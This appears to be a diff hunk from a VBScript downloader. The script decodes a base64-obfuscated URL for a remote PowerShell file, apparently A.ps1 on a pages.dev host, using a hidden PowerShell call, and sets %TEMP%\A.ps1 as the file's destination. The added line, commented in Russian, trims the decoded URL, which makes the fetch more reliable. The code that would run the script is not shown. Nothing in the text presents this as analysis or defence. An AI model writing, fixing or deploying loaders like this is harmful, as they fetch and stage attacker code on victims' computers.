@@ -4,6 +4,7 @@ Set stream = CreateObject("ADODB.Stream")
 
 b64url = "aHR0cHM6Ly8zLTRweC5wYWdlcy5kZXYvQS5wczE="
 url = shell.Exec("powershell -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & b64url & "'))").StdOut.ReadAll
+url = Trim(url) ' Удаляем лишние пробелы/переводы строки
 dest = shell.ExpandEnvironmentStrings("%TEMP%\A.ps1")
 
 On Error Resume Next
